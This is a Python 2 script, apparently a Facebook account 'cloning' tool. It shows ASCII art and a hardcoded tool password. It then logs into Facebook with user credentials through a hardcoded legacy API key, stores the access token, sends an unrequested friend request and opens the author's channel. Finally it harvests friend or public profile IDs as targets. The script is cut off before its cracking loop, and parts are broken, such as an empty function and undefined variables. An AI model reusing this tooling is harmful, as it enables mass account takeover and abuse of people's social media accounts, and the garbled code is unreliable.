 print cyan +"""                    @@@@@@@@~@@@~@@@~@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                     @@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                      @@@@@@@@~@@@~@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                       `@@@@@@@@@@@@@@@@@'              """
 time.sleep(0.01)
 print cyan +"""                           ~~@@@@@@@~~              """
 time.sleep(0.01)
def sem_15():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                     @@@              """
 time.sleep(0.01)
 print cyan +"""                     @@@              """
 time.sleep(0.01)
 print cyan +"""                      @@@              """
 time.sleep(0.01)
 print cyan +"""                      @@@              """
 time.sleep(0.01)
 print cyan +"""              @@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""            @@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""        @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""      @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""    @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""    @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""      @@@@@@@                        @@@@@@@              """
 time.sleep(0.01)
 print cyan +"""        @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@              """
 time.sleep(0.01)
 print cyan +"""          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""            @@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""              @@@@@@@@@@@@@@@@@@@@@@              """
def sem_16():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                                         .,,cccd$$$$$$$$$$$ccc,              """
 time.sleep(0.01)
 print cyan +"""                                     ,cc$$$$$$$$$$$$$$$$$$$$$$$$$cc,              """
 time.sleep(0.01)
 print cyan +"""                                   ,d$$$$$$$$$$$$$$$$"J$$$$$$$$$$$$$$c,              """
 time.sleep(0.01)
 print cyan +"""                                 d$$$$$$$$$$$$$$$$$$,$" ,,`?$$$$$$$$$$$$L              """
 time.sleep(0.01)
 print cyan +"""                               ,$$$$$$$$$$$$$$$$$$$$$',J$$$$$$$$$$$$$$$$$b              """
 time.sleep(0.01)
 print cyan +"""                              ,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i `$h              """
 time.sleep(0.01)
 print cyan +"""                              $$$$$$$$$$$$$$$$$$$$$$$$$P'  "$$$$$$$$$$$h $$              """
 time.sleep(0.01)
 print cyan +"""                             ;$$$$$$$$$$$$$$$$$$$$$$$$F,$$$h,?$$$$$$$$$$h$F              """
 time.sleep(0.01)
 print cyan +"""                             `$$$$$$$$$$$$$$$$$$$$$$$F:??$$$:)$$$$P",. $$F              """
 time.sleep(0.01)
 print cyan +"""                              ?$$$$$$$$$$$$$$$$$$$$$$(   `$$ J$$F"d$$F,$F              """
 time.sleep(0.01)
 print cyan +"""                               ?$$$$$$$$$$$$$$$$$$$$$h,  :P'J$$F  ,$F,$"              """
 time.sleep(0.01)
 print cyan +"""                                ?$$$$$$$$$$$$$$$$$$$$$$$ccd$$`$h, ",d$              """
 time.sleep(0.01)
 print cyan +"""                                 "$$$$$$$$$$$$$$$$$$$$$$$$",cdc $$$$"              """
 time.sleep(0.01)
 print cyan +"""                        ,uu,      `?$$$$$$$$$$$$$$$$$$$$$$$$$$$c$$$$h              """
 time.sleep(0.01)
 print cyan +"""                    .,d$$$$$$$cc,   `$$$$$$$$$$$$$$$$??$$$$$$$$$$$$$$$,              """
 time.sleep(0.01)
 print cyan +"""                  ,d$$$$$$$$$$$$$$$bcccc,,??$$$$$$ccf `"??$$$$??$$$$$$$              """
 time.sleep(0.01)
 print cyan +"""                 d$$$$$$$$$$$$$$$$$$$$$$$$$h`?$$$$$$h`:...  d$$$$$$$$P              """
 time.sleep(0.01)
 print cyan +"""                d$$$$$$$$$$$$$$$$$$$$$$$$$$$$`$$$$$$$hc,,cd$$$$$$$$P"              """
 time.sleep(0.01)
 print cyan +"""            =$$?$$$$$$$$P' ?$$$$$$$$$$$$$$$$$;$$$$$$$$$???????",,              """
 time.sleep(0.01)
 print cyan +"""               =$$$$$$F       `"?????$$$$$$$$$$$$$$$$$$$$$$$$$$$$$bc              """
 time.sleep(0.01)
 print cyan +"""               d$$F"?$$k ,ccc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i              """
 time.sleep(0.01)
 print cyan +"""        .     ,ccc$$c`""u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",$$$$$$$$$$$$h              """
 time.sleep(0.01)
 print cyan +"""     ,d$$$L  J$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" `""$$$??$$$$$$$              """
 time.sleep(0.01)
 print cyan +"""   ,d$$$$$$c,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F       `?J$$$$$$$'              """
 time.sleep(0.01)
 print cyan +"""  ,$$$$$$$$$$h`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F           ?$$$$$$$P""=,              """
 time.sleep(0.01)
 print cyan +""" ,$$$F?$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F              3$$$$II"?$h,              """
 time.sleep(0.01)
 print cyan +""" $$$$$`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P"               ;$$$??$$$,"?"              """
 time.sleep(0.01)
 print cyan +""" $$$$F ?$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",z'                3$$h   ?$F              """
 time.sleep(0.01)
 print cyan +"""        `?$$$$$$$$$$$$$$$??$$$$$$$$$PF"',d$P"                  "?$F              """
 time.sleep(0.01)
 print cyan +"""           """""""         ,z$$$$$$$$$$$$$P              """
 time.sleep(0.01)
 print cyan +"""                          J$$$$$$$$$$$$$$F              """
 time.sleep(0.01)
 print cyan +"""                         ,$$$$$$$$$$$$$$F              """
 time.sleep(0.01)
 print cyan +"""                         :$$$$$c?$$$$PF'              """
 time.sleep(0.01)
 print cyan +"""                         `$$$$$$$P              """
 time.sleep(0.01)
 print cyan +"""                          `?$$$$F              """
 time.sleep(0.01)
 
def sem_17():
 sem_1()
 time.sleep(0.01)
 print cyan +""" ,                                                               ,              """
 time.sleep(0.01)
 print cyan +""" \'.                                                           .'/              """
 time.sleep(0.01)
 print cyan +"""  ),\                                                         /,(               """
 time.sleep(0.01)
 print cyan +""" /__\'.                                                     .'/__\              """
 time.sleep(0.01)
 print cyan +""" \  `'.'-.__                                           __.-'.'`  /              """
 time.sleep(0.01)
 print cyan +"""  `)   `'-. \                                         / .-'`   ('              """
 time.sleep(0.01)
 print cyan +"""  /   _.--'\ '.          ,               ,          .' /'--._   \              """
 time.sleep(0.01)
 print cyan +"""  |-'`      '. '-.__    / \             / \    __.-' .'      `'-|              """
 time.sleep(0.01)
 print cyan +"""  \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /              """
 time.sleep(0.01)
 print cyan +"""   `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`              """
 time.sleep(0.01)
 print cyan +"""     )-'`        .'   :||  / -.\\ //.- \  ||:   '.        `'-(              """
 time.sleep(0.01)
 print cyan +"""    /          .'    / \\_ |  /o`^'o\  | _// \    '.          \              """
 time.sleep(0.01)
 print cyan +"""    \       .-'    .'   `--|  `"/ \"`  |--`   '.    '-.       /              """
 time.sleep(0.01)
 print cyan +"""     `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('              """
 time.sleep(0.01)
 print cyan +"""     /_.'     .-'  _.-'     \\ \/^\/ //     `-._  '-.     '._\              """
 time.sleep(0.01)
 print cyan +"""     \     .'`_.--'          \\     //          `--._`'.     /              """
 time.sleep(0.01)
 print cyan +"""      '-._' /`            _   \\-.-//   _            `\ '_.-'              """
 time.sleep(0.01)
 print cyan +"""          `<     _,..--''`|    \`"`/    |`''--..,_     >`              """
 time.sleep(0.01)
 print cyan +"""           _\  ``--..__   \     `'`     /   __..--``  /_              """
 time.sleep(0.01)
 print cyan +"""          /  '-.__     ``'-;    / \    ;-'``     __.-'  \              """
 time.sleep(0.01)
 print cyan +"""         |    _   ``''--..  \'-' | '-'/  ..--''``   _    |              """
 time.sleep(0.01)
 print cyan +"""         \     '-.       /   |/--|--\|   \       .-'     /              """
 time.sleep(0.01)
 print cyan +"""          '-._    '-._  /    |---|---|    \  _.-'    _.-'              """
 time.sleep(0.01)
 print cyan +"""              `'-._   '/ / / /---|---\ \ \ \'   _.-'`              """
 time.sleep(0.01)
 print cyan +"""                   '-./ / / / \`---`/ \ \ \ \.-'              """
 time.sleep(0.01)
 print cyan +"""                       `)` `  /'---'\  ` `(`              """
 time.sleep(0.01)
 print cyan +"""                 jgs  /`     |       |     `\              """
 time.sleep(0.01)
 print cyan +"""                     /  /  | |       | |  \  \              """
 time.sleep(0.01)
 print cyan +"""                 .--'  /   | '.     .' |   \  '--.              """
 time.sleep(0.01)
 print cyan +"""                /_____/|  / \._\   /_./ \  |\_____\              """
 time.sleep(0.01)
 print cyan +"""               (/      (/'     \) (/     `\)      \)              """
 time.sleep(0.01)

def sem_18():
 sem_1()
 time.sleep(0.01)
 print cyan +'''                          ooo              '''
 time.sleep(0.01)
 print cyan +'''                         $ o$              '''
 time.sleep(0.01)
 print cyan +'''                        o $$              '''
 time.sleep(0.01)
 print cyan +'''              ""$$$    o" $$ oo "              '''
 time.sleep(0.01)
 print cyan +'''          " o$"$oo$$$"o$$o$$"$$$$$ o              '''
 time.sleep(0.01)
 print cyan +'''         $" "o$$$$$$o$$$$$$$$$$$$$$o     o              '''
 time.sleep(0.01)
 print cyan +'''      o$"    "$$$$$$$$$$$$$$$$$$$$$$o" "oo  o              '''
 time.sleep(0.01)
 print cyan +'''     " "     o  "$$$o   o$$$$$$$$$$$oo$$              '''
 time.sleep(0.01)
 print cyan +'''    " $     " "o$$$$$ $$$$$$$$$$$"$$$$$$$o              '''
 time.sleep(0.01)
 print cyan +'''  o  $       o o$$$$$"$$$$$$$$$$$o$$"""$$$$o " "              '''
 time.sleep(0.01)
 print cyan +''' o          o$$$$$"    "$$$$$$$$$$ "" oo $$   o $              '''
 time.sleep(0.01)
 print cyan +''' $  $       $$$$$  $$$oo "$$$$$$$$o o $$$o$$oo o o              '''
 time.sleep(0.01)
 print cyan +'''o        o $$$$$oo$$$$$$o$$$$ ""$$oo$$$$$$$$"  " "o              '''
 time.sleep(0.01)
 print cyan +'''"   o    $ ""$$$$$$$$$$$$$$  o  "$$$$$$$$$$$$   o "              '''
 time.sleep(0.01)
 print cyan +'''"   $      "$$$$$$$$$$$$$$   "   $$$"$$$$$$$$o  o              '''
 time.sleep(0.01)
 print cyan +'''$   o      o$"""""$$$$$$$$    oooo$$ $$$$$$$$"  "              '''
 time.sleep(0.01)
 print cyan +'''$      o""o $$o    $$$$$$$$$$$$$$$$$ ""  o$$$   $ o              '''
 time.sleep(0.01)
 print cyan +''' o     " "o "$$$$  $$$$$""""""""""" $  o$$$$$"" o o              '''
 time.sleep(0.01)
 print cyan +''' "  " o  o$o" $$$$o   ""           o  o$$$$$"   o              '''
 time.sleep(0.01)
 print cyan +'''  $         o$$$$$$$oo            "oo$$$$$$$"    o              '''
 time.sleep(0.01)
 print cyan +'''  "$   o o$o $o o$$$$$"$$$$oooo$$$$$$$$$$$$$$"o$o              '''
 time.sleep(0.01)
 print cyan +'''    "o oo  $o$"oo$$$$$o$$$$$$$$$$$$"$$$$$$$$"o$"              '''
 time.sleep(0.01)
 print cyan +'''     "$ooo $$o$   $$$$$$$$$$$$$$$$ $$$$$$$$o"              '''
 time.sleep(0.01)
 print cyan +'''        "" $$$$$$$$$$$$$$$$$$$$$$" """"              '''
 time.sleep(0.01)
 print cyan +'''                         """"""              '''
 time.sleep(0.01)
 
def sem_19():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                        ,mmmmm,            ______     _________              """
 time.sleep(0.01)
 print cyan +"""                        @ooooo@,         / /. . \\   /./-----\.\              """
 time.sleep(0.01)
 print cyan +"""                        @0m0m0Q@        / /. . .`,\\>./,  ,  ,\.\              """
 time.sleep(0.01)
 print cyan +"""                        @0X00X@@       | |. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                     ____@0m00@_____   | | . . . |:|X| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                    @@@op(oboy)pop@@Ok | |. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                   @@@@opopopopop@@@p@@| | . . . |:|\| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                   @@o@@opopopopop@@op@@,|. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                   @@o@@popopopopopop@o@@| . . . |:|X| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                    @@o@@mmmmmmgogogo@oo@|. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                     @@@@@@@mmm'ooo@|@oo@| . . . |:|\| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                      @oooooooOOOO@"  @o@|. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                      @OoOoO@OoOoO@   @@@| . . . |:|X| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                      @oooo@@@oooo@   @@@|. . . .|:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                     .@@@o@@@@ooo@@  ,@@}| . . .//  \\_________/.|              """
 time.sleep(0.01)
 print cyan +"""                    .@@oo@@@@@@ooo@. "@@'|. . //     \==========/              """
 time.sleep(0.01)
 print cyan +"""                   .@ooooo@@@@@oooo@      \ //              """
 time.sleep(0.01)
 print cyan +"""                   @ooooO@' `@@ooo@|              """
 time.sleep(0.01)
 print cyan +"""                   @oooo@'   `@oooo@              """
 time.sleep(0.01)
 print cyan +"""                  @ooo@'     `oooo@|                    """
 time.sleep(0.01)
 print cyan +"""                  @oo@@'      `@oo@|                    """
 time.sleep(0.01)
 print cyan +"""                  @o@@|        @@o@,                         """
 time.sleep(0.01)
 print cyan +"""                  @@@@:        @@o@|                              """
 time.sleep(0.01)
 print cyan +"""                  @@@@:        @@o@|                        """
 time.sleep(0.01)
 print cyan +"""                  `@oo:        `@@@:              """
 time.sleep(0.01)
 print cyan +"""                  /@@@)        /@@@)              """
 time.sleep(0.01)
 print cyan +"""                (@@@@/       (@@@@/                        """
 time.sleep(0.01)
def help():
	
def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:love_hacker
##### LOGO #####
logo = """
\033[1;95m:•◈••◈•⸎ ⸎ ⸎⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎•◈••◈•
\033[1;95m:•◈••◈•⸎ ⸎ ⸎⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎•◈••◈•
\033[1;95m:•◈••◈•⸎ ⸎ ⸎⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎•◈••◈•
\033[1;95m:•◈••◈•⸎ ⸎ ⸎⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎•◈••◈•
\033[1;95m:•◈••◈•⸎ ⸎ ⸎⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎•◈••◈•
\033[1;95m:•◈••◈•⸎ ⸎ ⸎⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎•◈••◈•
\033[1;92m:•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•
\033[1;91m:•◈•▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀•◈•
\033[1;91m:•◈•▀██▄██▀\033[1;93m•◈•WhatsApp Number +923094161457•\033[1;91m▀██▄██▀▀██•◈•
\033[1;91m:•◈•▀██▄██▀\033[1;93m•◈•Lovehacker Kali.linux Cloning•\033[1;91m▀██▄██▀▀██•◈•
\033[1;91m:•◈•▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀•◈•
\033[1;92m:•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m•◈••◈••◈••◈••◈••◈•\033[1;92m╔★═█ \033[1;91m┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈•◈••◈••◈••◈••◈••◈•
\033[1;91m•◈••◈••◈••◈••◈••◈•\033[1;92m🆁═══════╬█║▷\033[1;91m┈┈┈┈┈┈┈┈┈┈ •◈••◈••◈••◈••◈••◈•
\033[1;91m•◈••◈••◈••◈••◈••◈•\033[1;92m╚═█████▓▒█▒▓█████║〓\033[1;91m┈┈┈•◈••◈••◈••◈••◈••◈•
\033[1;91m•◈••◈••◈••◈••◈••◈•\033[1;92m○°◢███◤✇═╩═╩═╝╯🄵\033[1;91m┈┈┈┈┈┈•◈••◈••◈••◈••◈••◈•
\033[1;91m•◈••◈••◈••◈••◈••◈•\033[1;92m◢███◤✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m┈┈┈┈┈┈┈•◈••◈••◈••◈••◈••◈•
\033[1;91m•◈••◈••◈••◈••◈••◈•\033[1;92m████║○○○○\033[1;91m┈┈┈┈┈┈┈┈┈┈┈┈┈┈•◈••◈••◈••◈••◈••◈•
\033[1;91m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈•
   \033[1;93m•◈••◈••◈••◈••◈••◈•\033[1;92mWelcome To Kali.linux\033[1;93m•◈••◈••◈••◈••◈••◈••◈••
\033[1;92m   •◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;95m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•
\033[1;94m   •◈•▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀•◈•
\033[1;94m   •◈•▀██▄██▀▀█\033[1;91m【L】【o】【v】【e】-【H】【a】【c】【k】【e】【r】\033[1;94m███▄██▀•◈•
\033[1;94m   •◈•▀██▄██▀▀██\033[1;91m....０３０９４１６１４５７....\033[1;94m█▀▀██▄██▀•◈•
\033[1;94m   •◈•▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀▀██▄██▀•◈•
\033[1;92m   •◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"""
jalan('              \033[1;96m▀██▄██▀▀██▄██▀...Kali.linux....▀██▄██▀▀██▄██▀.:')
jalan("\033[1;92m   ▀██▄██▀▀██▄██▀•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•▀██▄██▀▀██▄██▀   ")
jalan('\033[1;93m   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈   ')
jalan('\033[1;93m   ┈┈┈┈┈┈\033[1;91m【K】【a】【l】【i】 - 【L】【i】【n】【u】【x】\033[1;93m┈┈┈┈┈┈   ')
jalan("\033[1;93m   ┈┈┈┈┈┈\033[1;91m.....０３０９４１６１４５７....\033[1;93m┈┈┈┈┈┈┈┈┈ ")
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈")
print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mLogin Kali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"

CorrectUsername = "linux"
CorrectPassword = "lovehacker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m📋 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m🗝 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;93mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;91mWarning: \033[1;94mDo Not Use Your Personal Account' )
		jalan(' \033[1;91m   Note: \033[1;94mUse a New Account To Login' )
		jalan(' \033[1;91mWarning: \033[1;94mlogin sy pahly indonasia ki proxy connect kar lain' )                 
		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
		print('	   \033[1;94m♡\x1b[1;91m✔✔✔✔✔✔✔LOGIN WITH FACEBOOK✔✔✔✔✔✔✔\x1b[1;94m♡' )
		print('	' )
		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;93m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;91mPassword\x1b[1;96m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;92mLogin Successful.•◈•..'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;93mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;94mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:love_hacker
	print logo
	print "  \033[1;92m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;92m----•◈••◈•-----»"
	print "	   \033[1;91m Name\033[1;93m:\033[1;92m"+nama+"\033[1;93m               "
	print "	   \033[1;91m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;93m              "
	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
	print "\033[1;97m-•◈•-\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m1.\x1b[1;95mClone From Friend List👬."
	print "\033[1;92m-•◈•-\033[1;91m> \033[1;92m2.\x1b[1;95mClone From Public ID👨‍👨‍👦‍👦."
	print "\033[1;92m-•◈•-\033[1;91m> \033[1;91m0.\033[1;94mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;94mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
		jalan('\033[1;95mGetting IDs \033[1;93m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[•◈•] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
